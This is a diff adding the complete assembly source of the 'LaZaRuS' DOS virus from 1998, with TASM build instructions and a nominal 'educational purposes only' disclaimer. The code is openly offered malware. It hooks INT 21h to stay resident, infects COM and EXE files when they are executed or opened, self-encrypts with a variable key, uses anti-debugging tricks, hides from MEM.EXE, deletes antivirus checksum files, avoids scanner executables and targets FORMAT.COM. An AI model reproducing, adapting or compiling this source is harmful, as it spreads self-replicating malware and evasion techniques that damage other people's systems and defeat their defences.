@@ -1,0 +1,836 @@
+;----------------------------------------------------------------------------
+; LAZARUS.ASM - The LaZaRuS Virus (C)opyright 1998 The Shaitan/SLAM
+;
+; [Features]:
+; * Memory Stealth    : Invisible to MEM.EXE & no memory decrease.
+; * COM/EXE Infection : Infect on execute & open (fast infector).
+; * Self-Encryption   : Uses variable encryption.
+; * Anti-Debugging    : Armoured decryption routine.
+; * Anti-Anti-Virus   : Deletes checksum files.
+;
+; To compile, use:
+; TASM /m2 lazarus.asm
+; TLINK /t lazarus.obj
+;
+; THIS PROGRAM IS MEANT FOR EDUCATIONAL PURPOSES ONLY. THE AUTHOR CANNOT BE
+; HELD LIABLE FOR MISUSE OF THE SAME.
+;
+;----------------------------------------------------------------------------
+
+.model tiny
+JUMPS                                   ; TASM only
+
+_TEXT segment word public 'CODE'
+org 100h                                ; All COM files start here...
+virus_start:
+        push    ds                      ; Save DS *Important*
+
+        push    cs                      ; Set DS to CS
+        pop     ds                      ;
+
+        call    next_line               ; Get an IP pointer
+next_line:                              ; using the usual trick!
+        pop     si                      ;
+        sub     si,offset next_line     ;
+
+        mov     dx,offset new3          ; Set Int 3h *Anti-Debug*
+        add     dx,si                   ;
+        mov     ax,2503h                ;
+        int     21h                     ;
+
+decrypt:
+        push    cs                      ; Set ES:DI to start of
+        pop     es                      ; encrypted viral code
+
+; MOV DI,xxxx patch
+mov_di:                                 ; This becomes:
+        db      0BFh                    ; mov di,xxxxh
+patch_di:                               ;
+        dw      offset encrypt_begin    ;
+
+        mov     cx,encrypt_end-encrypt_begin    ; How many bytes to decrypt?
+
+decrypt_loop:
+        int     3h                      ; Decrypt (Heh,Heh) *Anti-Debug*
+        inc     di                      ; Next byte
+        loop    decrypt_loop            ; Loop till done
+
+        jmp     encrypt_begin           ; Jump to start of virus
+
+new3:
+xor_esdi:                               ; This becomes:
+        db      26h,80h,35h             ; xor byte ptr es:[di],xxh
+patch_key:                              ;
+        db      00                      ; Encryption key
+
+        iret                            ; Int return
+
+encrypt_begin:
+        mov     ax,0D123h               ; Are we resident already?
+        int     21h                     ; Call DOS
+        cmp     ax,0123Dh               ; Check return value
+        je      restore_file            ; Yeah. Don't go TSR again!
+
+        push    si                      ; Save SI
+
+        call    get_last_mcb            ; MCB in ES:BP
+
+        call    shrink_last_mcb         ; Decrease memory by 6K
+
+        add     ax,word ptr es:[bp+3]   ; Calculate our location in
+        inc     ax                      ; memory
+
+copy_virus_to_memory:
+        mov     es,ax                   ; Set ES:DI to virus
+        mov     di,100h                 ; memory location
+
+        push    cs                      ; Set DS:SI to virus source
+        pop     ds                      ; location
+        pop     si                      ; Restore SI
+
+        push    si                      ; Save it again
+
+        add     si,100h                 ; Adjust in file
+
+        mov     cx,virus_end-virus_start; Size of virus
+        cld                             ; Copy upwards into memory
+
+        rep     movsb                   ; Copy to memory !!!
+
+get_vectors:
+        push    es                      ; Set DS to ES
+        pop     ds                      ; "     "       "
+
+        mov     ax,3521h                ; Get vector for Int 21h
+        int     21h                     ; Call DOS
+        mov     word ptr ds:[old21],bx  ; Save
+        mov     word ptr ds:[old21+2],es; Save
+
+set_vectors:
+        mov     ax,2521h                ; Set Vector for Int 21h
+        mov     dx,offset new21         ; Set DS:DX to new handler
+        int     21h                     ; Call DOS
+
+        pop     si                      ; Restore SI
+
+restore_file:
+
+        push    cs                      ; Display the message
+        pop     ds
+
+infect_format_com:
+dos_format:
+        mov     dx,offset dos_format_com; Try to infect DOS FORMAT.COM
+        add     dx,si                   ; Adjust
+        mov     ax,3d00h                ; Open (also infect)
+        int     21h                     ; Call DOS
+        jnc     format_end              ; Success!
+
+win_format:
+        mov     dx,offset win_format_com; Try to infect Win 95 FORMAT.COM
+        add     dx,si                   ; Adjust
+        mov     ax,3d00h                ; Open (also infect)
+        int     21h                     ; Call DOS
+        jnc     format_end              ; Success!
+
+w95_format:
+        mov     dx,offset w95_format_com; Try to infect Win 95 FORMAT.COM
+        add     dx,si                   ; Adjust
+        mov     ax,3d00h                ; Open (also infect)
+        int     21h                     ; Call DOS
+        jc      anti_chksum             ; Failed!
+
+format_end:
+        xchg    ax,bx                   ; Handle in BX
+        mov     ah,3eh                  ; Close file
+        int     21h                     ; Call DOS
+
+anti_chksum:
+        mov     dx,offset antivir_dat   ; Delete ANTI-VIR.DAT
+        add     dx,si                   ; Adjust
+        call    killfile                ; Delete it!
+
+        mov     dx,offset chklist_cps   ; Delete CHKLIST.CPS
+        add     dx,si                   ; Adjust
+        call    killfile                ; Delete it!
+
+        mov     dx,offset chklist_ms    ; Delete CHKLIST.MS
+        add     dx,si                   ; Adjust
+        call    killfile                ; Delete it!
+
+; Don't forget to restore the saved DS !!!
+        pop     ds                      ; Get back DS * Important *
+
+        cmp     byte ptr cs:[file_type+si],'O'  ; Is this Generation-1?
+        je      quit
+
+        cmp     byte ptr cs:[file_type+si],'C'  ; Which filetype COM/EXE?
+        je      restore_com
+
+restore_exe:
+        mov     ax,ds                   ; Get DS in AX
+        add     ax,10h                  ; Add 10h
+        add     ax,word ptr cs:[ori_ss+si] ; Set SS
+
+        cli                             ; Restore SS:SP
+        mov     ss,ax                   ;
+        mov     sp,word ptr cs:[ori_sp+si]
+        sti                             ;
+
+        mov     ax,ds                   ; Restore CS:IP
+        add     ax,10h                  ;
+        add     word ptr cs:[ori_cs+si],ax
+
+        sub     ax,10h                  ;
+        mov     es,ax                   ;
+
+        xor     ax,ax                   ; Restore all registers
+        xor     bx,bx                   ;
+        xor     cx,cx                   ;
+        xor     dx,dx                   ;
+        xor     si,si                   ;
+        xor     di,di                   ;
+        xor     bp,bp                   ;
+
+The_BigJump:
+farjmp_code     db      0EAh            ; JMP xxxx:xxxx
+ori_ip          dw      ?               ; Original IP
+ori_cs          dw      ?               ; Original CS
+
+ori_ss          dw      ?               ; Original SS
+ori_sp          dw      ?               ; Original SP
+
+restore_com:
+        push    cs                      ; Set ES
+        pop     es                      ;
+
+        push    cs                      ; Set DS
+        pop     ds                      ;
+
+        add     si,offset ori_bytes     ; Restore first 5 bytes
+        mov     di,100h                 ; in the COM file
+        mov     cx,5                    ;
+        cld                             ;
+        rep     movsb                   ;
+
+        xor     bx,bx                   ; Restore registers
+        xor     cx,cx                   ;
+        xor     dx,dx                   ;
+        xor     bp,bp                   ;
+        xor     di,di                   ;
+        xor     si,si                   ;
+
+        mov     ax,100h                 ; A clever way to
+        push    ax                      ; JMP 100h
+        xor     ax,ax                   ;
+        ret                             ;
+
+quit:
+        mov     ax,4c00h                ; DOS Exit Call
+        int     21h                     ; Call DOS
+
+;- INTERRUPT VECTORS --------------------------------------------------------
+
+;- INT 21h HANDLER ----------------------------------------------------------
+new21:                                  ; DOS Services Interrupt
+function_check:
+        cmp     ax,0D123h               ; Is it our residency check call?
+        jne     check_rest              ; Nope. Check for other calls
+        mov     ax,0123Dh               ; Set expected value in AX
+        iret                            ; Return
+
+check_rest:
+save_regs:                              ; Save registers before infecting
+        push    ax                      ;
+        push    bx                      ;
+        push    cx                      ;
+        push    dx                      ;
+        push    di                      ;
+        push    si                      ;
+        push    bp                      ;
+        push    ds                      ;
+        push    es                      ;
+        pushf                           ;
+
+check_exec:
+        cmp     ah,4bh                  ; DOS EXEC Call?
+        jne     check_exit              ; No. Check exit call...
+
+        call    chk_badfilename         ; Check for bad files
+        cmp     ax,1                    ; Bad?
+        je      restore_regs            ; Yeah. Don't Infect...
+
+        cmp     ax,'M'                  ; MEM.EXE?
+        jne     do_infect               ; No. Jump...
+
+        mov     byte ptr cs:[in_mem],1  ; Mark as MEM running
+        call    get_last_mcb            ; Get 'Z' block
+        call    expand_last_mcb         ; Give back mem blocks
+        jmp     do_infect               ; Now infect MEM.EXE
+
+check_exit:
+        cmp     ah,4ch                  ; EXIT Call?
+        jne     check_normal_open       ; No. Jump...
+
+        cmp     byte ptr cs:[in_mem],1  ; MEM is running?
+        jne     restore_regs            ; No.Jump...
+
+        mov     byte ptr cs:[in_mem],0  ; MEM.EXE not running anymore...
+        call    get_last_mcb            ; Get 'Z' block...
+        call    shrink_last_mcb         ; Decrease MCB block
+        jmp     restore_regs
+
+check_normal_open:
+        cmp     ah,3dh                  ; DOS NORMAL Open Call?
+        jne     check_extended_open     ; No. Jump...
+
+        call    chk_badfilename         ; Check if we can infect this file?
+        cmp     ax,1                    ; Not ok to infect?
+        je      restore_regs            ; Yes. Cannot infect :(
+
+        call    chk_extension           ; Is this .COM/.EXE?
+        cmp     ax,0                    ; "     "       "
+        je      restore_regs            ; No. Jump...
+
+        jmp     do_infect               ; Yes. Infect!
+
+check_extended_open:
+        cmp     ah,6ch                  ; DOS EXTENDED Open?
+        jne     restore_regs            ; No. Jump...
+
+        mov     dx,si                   ; DS:SI -> DS:DX -> Filename
+
+        call    chk_badfilename         ; Check if we can infect this file?
+        cmp     ax,1                    ; Not ok to infect?
+        je      restore_regs            ; Yes. Cannot infect :(
+
+        call    chk_extension           ; Is this .COM/.EXE?
+        cmp     ax,0                    ; "     "       "
+        je      restore_regs            ; No. Jump...
+
+        jmp     do_infect               ; Yes. Infect...
+
+do_infect:
+        call    infect                  ; Call infection routine
+
+restore_regs:                           ; Restore Registers after infecting
+        popf                            ;
+        pop     es                      ;
+        pop     ds                      ;
+        pop     bp                      ;
+        pop     si                      ;
+        pop     di                      ;
+        pop     dx                      ;
+        pop     cx                      ;
+        pop     bx                      ;
+        pop     ax                      ;
+
+do_old21:
+        jmp     dword ptr cs:old21      ; Jump to original handler
+
+;----------------------------------------------------------------------------
+;- INFECTION ROUTINE --------------------------------------------------------
+infect:
+
+        call    chk_badfilename         ; Check for files we musn't infect
+        cmp     ax,1                    ; Is it a bad one?
+        je      infect_end              ; Yeah. Don't infect...
+
+        mov     ax,4300h                ; Get file attributes
+        int     21h                     ; Call DOS
+        mov     word ptr cs:[ori_attrib],cx ; Save attributes
+        jc      infect_end              ; Error !!!
+
+        mov     ax,4301h                ; Set file attributes
+        xor     cx,cx                   ; Remove all attributes
+        int     21h                     ; Call DOS
+        jc      infect_end              ; Error !!!
+
+        push    ds                      ; Save filename (DS:DX)
+        push    dx                      ;
+
+start_infect:
+        mov     ax,3d02h                ; Open file for reading/write
+        call    olddos                  ; Call DOS
+        jc      restore_attrib          ; Error !!!
+        xchg    ax,bx                   ; BX = Handle
+
+save_date:
+        mov     ax,5700h                     ; Get File Date/Time
+        int     21h                          ; Call DOS
+        mov     word ptr cs:[ori_date],dx    ; Save Date
+        mov     word ptr cs:[ori_time],cx    ; Save Time
+
+read_header:
+        mov     ah,3fh                          ; Read File
+        mov     cx,exe_header_end - exe_header_start
+        push    cs                              ; Set DS To CS
+        pop     ds
+        mov     dx,offset exe_header_start
+        int     21h                             ; Call DOS
+        jc      restore_date                    ; Error !!!
+
+check_exe:
+        cmp     word ptr cs:[exe_magic],'ZM' ; Is it 'MZ'?
+        je      check_infect                    ; Yes. Jump...
+        cmp     word ptr cs:[exe_magic],'MZ' ; Is it 'ZM'?
+        jne     iscom                           ; No. Must be a COM file
+
+check_infect:
+        cmp     word ptr cs:[checksum],'LZ'     ; LaZaRuS!
+        je      restore_date                    ; Infected already...
+
+save_original_values:
+        mov     ax,word ptr cs:[cs_loc]         ; Original CS
+        mov     word ptr cs:[ori_cs],ax
+
+        mov     ax,word ptr cs:[ip_loc]         ; Original IP
+        mov     word ptr cs:[ori_ip],ax
+
+        mov     ax,word ptr cs:[ss_loc]         ; Original SS
+        mov     word ptr cs:[ori_ss],ax
+
+        mov     ax,word ptr cs:[sp_loc]         ; Original SP
+        mov     word ptr cs:[ori_sp],ax
+
+is_exe:
+        call    goto_eof                ; Goto EOF
+
+        push    dx                      ; Save DX:AX
+        push    ax                      ;
+
+; Here we check if the file contains overlays (or is a Windows EXE)
+
+calculate_realfilesize:
+        mov     cx,512                  ; Divide DX:AX by 512
+        div     cx                      ; Divide
+
+        cmp     dx,0                    ; Is it exactly divisible?
+        je      no_rounding             ; Yes. Do not adjust...
+
+        inc     ax                      ; Adjust...
+no_rounding:
+        cmp     ax,word ptr cs:[pages]  ; Check if reported pages are correct
+        je      chk_lastpage
+        pop     ax                      ; Pop off the stack
+        pop     dx                      ; "     "       "
+        jmp     restore_date            ; Do not infect this file
+chk_lastpage:
+        cmp     dx,word ptr cs:[last_page]  ; Verify bytes on last page
+        pop     ax                      ; Pop off the stack
+        pop     dx                      ; "     "       "
+        jne     restore_date            ; Do not infect
+
+        push    dx                      ; Save filesize
+        push    ax                      ;
+
+calculate:
+        mov     ax,word ptr cs:[header_size] ; Size of header in paras
+        mov     cx,16                           ; Multiply by 16
+        mul     cx                              ; DX:AX - Result
+        mov     cx,ax                           ; Save result in AX
+
+        pop     ax
+        pop     dx
+
+        sub     ax,cx                   ; Subtract size of header
+        sbb     dx,0                    ; Subtract with borrow
+
+        mov     cx,16                   ; Now we divide DX:AX by 16
+        div     cx                      ; Divide...
+
+        mov     word ptr cs:[cs_loc],ax      ; New CS
+        mov     word ptr cs:[ip_loc],dx      ; New IP
+
+; * IMPORTANT *
+        sub     dx,100h                      ; Patched offset
+        add     dx,offset encrypt_begin      ; MOV DI patch
+        mov     word ptr cs:[patch_di],dx    ; Save patched "mov di,xxxx"
+
+        mov     word ptr cs:[ss_loc],ax      ; Save new SS
+        mov     word ptr cs:[sp_loc],0fffeh  ; Save new SP
+
+set_file_type:
+        mov     byte ptr cs:[file_type],'E'     ; Set as infected 'E'xe
+
+set_infected:
+        mov     word ptr cs:[checksum],'LZ'     ; Mark as infected
+
+append_exe:
+        call    append_virus            ; Append virus to file
+
+get_new_filesize:
+        call    goto_eof                ; Goto EOF
+
+calculate_pages:
+        mov     cx,512                  ; Divide DX:AX by 512
+        div     cx                      ; Divide
+
+        cmp     dx,0                    ; Is it exactly divisible?
+        je      set_pages               ; Yes. Do not adjust...
+
+        inc     ax                      ; Adjust...
+
+set_pages:
+        mov     word ptr cs:[last_page],dx   ; Bytes on last page
+        mov     word ptr cs:[pages],ax       ; Number of pages
+
+        call    goto_bof                ; Goto BOF
+
+write_header:
+        mov     ah,40h                          ; Write to file
+        mov     dx,offset exe_header_start      ; DS:DX - Exe Header
+        mov     cx,exe_header_end - exe_header_start
+        int     21h                             ; Write new header
+
+        jmp     restore_date                    ; EXE Infection over!
+
+iscom:
+        call    goto_bof                ; Goto BOF
+
+        mov     ah,3fh                  ; Save the original bytes
+        mov     dx,offset ori_bytes     ;
+        mov     cx,5                    ;
+        int     21h                     ;
+
+        cmp     word ptr cs:[ori_bytes+3],'LZ'
+        je      restore_date
+
+goto_comend:
+        call    goto_eof                ; Goto EOF
+
+        cmp     ax,65535-(virus_end-virus_start); COM file musn't exceed 64K
+        ja      restore_date            ; Do not infect this file!
+
+; * IMPORTANT *
+        add     ax,offset encrypt_begin         ;
+        mov     word ptr cs:[patch_di],ax       ; Patch "mov di,xxxx"
+        sub     ax,offset encrypt_begin         ;
+
+        sub     ax,3                            ; Calculate dispalcement
+        mov     word ptr cs:[new_bytes+1],ax    ; Save
+
+set_comfiletype:
+        mov     byte ptr cs:[file_type],'C'     ; This is a Com file...
+
+append_com:
+        call    append_virus            ; Append the virus to the file
+
+write_newcomhdr:                        ;
+        call    goto_bof                ; Goto BOF
+
+        mov     ah,40h                  ; Write the new JMP xxxx instruction
+        mov     cx,5                    ;
+        mov     dx,offset new_bytes     ;
+        int     21h
+
+restore_date:
+        mov     ax,5701h                        ; Set File Date/Time
+        mov     dx,word ptr cs:[ori_date]       ; Set Date
+        mov     cx,word ptr cs:[ori_time]       ; Set Time
+        int     21h                             ; Call DOS
+
+        mov     ah,3eh                  ; Close File
+        int     21h                     ; Call DOS
+
+restore_attrib:                         ; Restore file attributes/date
+
+        pop     dx                      ; Get back filename in DS:DX
+        pop     ds                      ;
+
+        mov     ax,4301h                        ; Set file attrib
+        mov     cx,word ptr cs:[ori_attrib]     ; Restore
+        int     21h                             ; Call DOS
+
+infect_end:
+        ret                             ; Return
+
+;----------------------------------------------------------------------------
+
+;- GENERAL PURPOSE FUNCTIONS ------------------------------------------------
+get_last_mcb:
+        mov     ah,52h                  ; DOS Undocumented Function
+        int     21h                     ; to Get List Of Lists...
+
+        sub     bx,2                    ; ES:BX - Pointer to 1st MCB segment
+        xchg    bx,bp                   ; Now, ES:BP points to 1st MCB segment
+        mov     ax,word ptr es:[bp]     ; Get MCB segment
+MCB_loop:
+        mov     es,ax                   ; ES is 1st MCB segment now
+        xor     bp,bp                   ; BP = 0
+        cmp     byte ptr es:[bp],'Z'    ; Last MCB block?
+        je      last_block              ; Yes! Jump...
+        add     ax,word ptr es:[bp+3]   ; No... Get next MCB segment
+        inc     ax                      ; Add one segment goes for MCB header
+        jmp     MCB_loop                ; Loop till last block found
+
+last_block:
+        ret
+
+;----------------------------------------------------------------------------
+shrink_last_mcb:
+        sub     word ptr es:[bp+3h],256 ; Decrease memory by 4k
+        sub     word ptr es:[bp+12h],256; "     "       "       "
+        ret
+
+;----------------------------------------------------------------------------
+expand_last_mcb:
+        add     word ptr es:[bp+3h],256 ; Decrease memory by 4k
+        add     word ptr es:[bp+12h],256; "     "       "       "
+        ret
+
+;----------------------------------------------------------------------------
+chk_badfilename:                        ; Check for files we musn't infect
+        push    ds                      ; Save filename
+        push    dx                      ;
+
+        mov     cx,128                  ; Max length of filename
+        push    ds                      ; ES:DI - Filename
+        pop     es                      ;
+        mov     di,dx                   ;
+        mov     al,0                    ; Look for the end of filename
+        cld                             ; Direction = UP
+        repne   scasb                   ; Search now!
+
+chkcommmand:
+        cmp     word ptr es:[di-12],'OC'; 'CO'
+        jne     chkwin                  ; No. Jump...
+        cmp     word ptr es:[di-10],'MM'; 'MM'
+        je      bad_filename            ; Yes. Jump
+
+chkwin:
+        cmp     word ptr es:[di-8],'IW' ; 'WI'
+        jne     chkfprot                ; No. Jump...
+        cmp     word ptr es:[di-6],'.N' ; 'N.'
+        je      bad_filename            ; Yes. Jump
+
+chkfprot:
+        cmp     word ptr es:[di-11],'-F'; 'F-'
+        jne     chkvirstop              ; No. Jump...
+        cmp     word ptr es:[di-9],'RP' ; 'PR'
+        je      bad_filename            ; No. Jump
+
+chkvirstop:
+        cmp     word ptr es:[di-12],'IV'; 'VI'
+        jne     chktbav                 ; No. Jump...
+        cmp     word ptr es:[di-10],'SR'; 'RS'
+        je      bad_filename            ; No. Jump
+
+chktbav:
+        cmp     word ptr es:[di-9],'BT' ; 'TB'
+        jne     chkscan                 ; No. Jump...
+        cmp     word ptr es:[di-7],'VA' ; 'AV'
+        je      bad_filename            ; No. Jump
+
+chkscan:
+        cmp     word ptr es:[di-9],'CS' ; 'SC'
+        jne     chkmsav                 ; No. Jump...
+        cmp     word ptr es:[di-7],'NA' ; 'AN'
+        je      bad_filename            ; No. Jump
+
+chkmsav:
+        cmp     word ptr es:[di-9],'SM' ; 'MS'
+        jne     chkcpav                 ; No. Jump...
+        cmp     word ptr es:[di-7],'VA' ; 'AV'
+        je      bad_filename            ; No. Jump
+
+chkcpav:
+        cmp     word ptr es:[di-9],'PC' ; 'CP'
+        jne     chkclean                ; No. Jump...
+        cmp     word ptr es:[di-7],'VA' ; 'AV'
+        je      bad_filename            ; No. Jump
+
+chkclean:
+        cmp     word ptr es:[di-10],'LC'; 'CL'
+        jne     chkmem                  ; No. Jump...
+        cmp     word ptr es:[di-8],'AE' ; 'EA'
+        je      bad_filename            ; No. Jump
+
+chkmem:
+        cmp     word ptr es:[di-8],'EM'; 'ME'
+        jne     unknown_file            ; No. Jump...
+        cmp     word ptr es:[di-6],'.M' ; 'M.'
+        jne     unknown_file            ; No. Jump
+
+; We found MEM.EXE
+        mov     ax,'M'                  ; Mark as MEM!
+        pop     dx                      ; "     "       "
+        pop     ds                      ; "     "       "
+        ret                             ; Return
+
+bad_filename:
+        mov     ax,1                    ; Mark as BAD!
+        pop     dx                      ; "     "       "
+        pop     ds                      ; "     "       "
+        ret                             ; Return
+
+unknown_file:
+        mov     ax,0                    ; Mark as OK!
+        pop     dx                      ; Restore filename
+        pop     ds                      ;
+        ret                             ; Return
+
+;----------------------------------------------------------------------------
+chk_extension:
+        push    ds                      ; Save filename
+        push    dx                      ;
+
+        mov     cx,128                  ; Max length of filename
+        push    ds                      ; ES:DI - Filename
+        pop     es                      ;
+        mov     di,dx                   ;
+        mov     al,0                    ; Look for the last byte in the filename
+        cld                             ; Direction = UP
+        repne   scasb                   ; Search now!
+
+chkcom:
+        cmp     word ptr es:[di-5],'C.' ; .Cxx?
+        jne     chkexe                  ; No. Jump...
+        cmp     word ptr es:[di-3],'MO' ; .COM?
+        jne     chkexe                  ; No. Jump
+
+        mov     ax,1                    ; Set expected value
+        jmp     chkext_end              ; Return
+
+chkexe:
+        cmp     word ptr es:[di-5],'E.' ; .Exx?
+        jne     unknown_ext             ; No. Jump...
+        cmp     word ptr es:[di-3],'EX' ; .EXE?
+        jne     unknown_ext             ; No. Jump
+
+        mov     ax,2                    ; Set value for EXE
+        jmp     chkext_end              ; Return
+
+unknown_ext:
+        mov     ax,0                    ; Unknown file return
+
+chkext_end:
+        pop     dx                      ; Restore filename
+        pop     ds                      ;
+        ret                             ; Return
+
+;---
+olddos:
+        pushf                           ; Save flags
+        call    dword ptr cs:[old21]    ; Fake an INT
+        ret                             ; Return
+;---
+goto_bof:
+        mov     ax,4200h                ; Goto BOF
+        xor     cx,cx                   ; CX:DX = Offset
+        xor     dx,dx                   ; "     "       "
+        int     21h                     ; Call DOS
+        ret
+
+;---
+goto_eof:
+        mov     ax,4202h                ; Goto EOF
+        xor     cx,cx                   ; CX:DX = Offset
+        xor     dx,dx                   ; "     "       "
+        int     21h                     ; Call DOS
+        ret
+
+;---
+append_virus:
+        mov     ah,2ch                  ; DOS Get Time function
+        int     21h                     ; Call DOS
+        add     ch,cl                   ; Add up hour+min+sec+100th of sec
+        add     ch,dh                   ; "     "       "
+        add     ch,dl                   ; "     "       "
+        mov     al,ch                   ; Da encryption key!
+
+        mov     byte ptr cs:[patch_key],al      ; Save the encryption key
+
+        push    cs                      ; DS:SI - Start
+        pop     ds                      ; ES:DI - Destination
+        push    cs                      ;
+        pop     es                      ;
+        mov     si,100h                 ;
+        mov     di,offset virus_end     ;
+        mov     cx,offset virus_end-virus_start ; No. of bytes
+        rep     movsb                   ; Copy all bytes
+
+encrypt:
+        mov     di,offset virus_end             ; ES:DI - Start of encryption
+        add     di,offset encrypt_begin-100h    ;
+        mov     cx,encrypt_end-encrypt_begin    ; How many bytes to encrypt?
+encrypt_loop:
+        xor     byte ptr es:[di],al     ; Encrypt one byte at a time
+        inc     di                      ; Next byte
+        loop    encrypt_loop            ; Loop till done
+
+        mov     ah,40h                  ; Write to file
+        mov     cx,virus_end-virus_start; No. of bytes
+        mov     dx,offset virus_end     ; DS:DX - Start of buffer
+        int     21h                     ; Call DOS and write
+        ret
+;---
+killfile:
+        mov     ax,4301h                ; Remove all attributes
+        xor     cx,cx                   ; from the filename in DS:DX
+        int     21h                     ;
+
+        mov     ah,41h                  ; Delete file
+        int     21h                     ; Call DOS
+
+        ret
+
+;- VIRUS DATA ---------------------------------------------------------------
+copyright       db      "The Lazarus Virus (c) '98 The Shaitan/SLAM"
+
+old21           dd      ?               ; Old Int 21 Handler
+
+; EXE Header of infected file will be stored here
+exe_header:
+
+exe_header_start:
+
+exe_magic       dw      ?               ; 'MZ' if EXE file
+last_page       dw      ?               ; Bytes on last page in file
+pages           dw      ?               ; Number of pages in file
+relocation      dw      ?               ; Number of relocations in file
+header_size     dw      ?               ; Size of EXE header
+min_mem         dw      ?               ; Minimum memory needed
+max_mem         dw      ?               ; Maximum memory needed
+ss_loc          dw      ?               ; SS location
+sp_loc          dw      ?               ; SP location
+checksum        dw      ?               ; Checksum (?)
+ip_loc          dw      ?               ; IP location
+cs_loc          dw      ?               ; CS location
+
+exe_header_end:
+
+; Original 5 bytes of a com file stored here
+ori_bytes        db      5 dup(0)
+
+; New 5 bytes in COM file
+new_bytes       db      0E9h            ; JMP opcode
+                dw      ?               ; Jump displacement
+                dw      'LZ'            ; Marker bytes
+
+
+ori_attrib      dw      ?               ; Original Attributes
+ori_date        dw      ?               ; Original Date
+ori_time        dw      ?               ; Original Time
+
+; File type: 'O'riginal/'C'om/'E'xe?
+file_type       db      'O'             ; Generation-1 is 'O'
+
+in_mem          db      0               ; Is MEM.EXE running?
+
+; Try to infect one of these files first:
+dos_format_com      db      "C:\DOS\FORMAT.COM",0
+win_format_com      db      "C:\WINDOWS\COMMAND\FORMAT.COM",0
+w95_format_com      db      "C:\WIN95\COMMAND\FORMAT.COM",0
+
+checksum_files:
+antivir_dat     db      "ANTI-VIR.DAT",0
+chklist_cps     db      "CHKLIST.CPS",0
+chklist_ms      db      "CHKLIST.MS",0
+
+encrypt_end:
+
+virus_end:
+_TEXT ends
+end virus_start
+;----------------------------------------------------------------------------
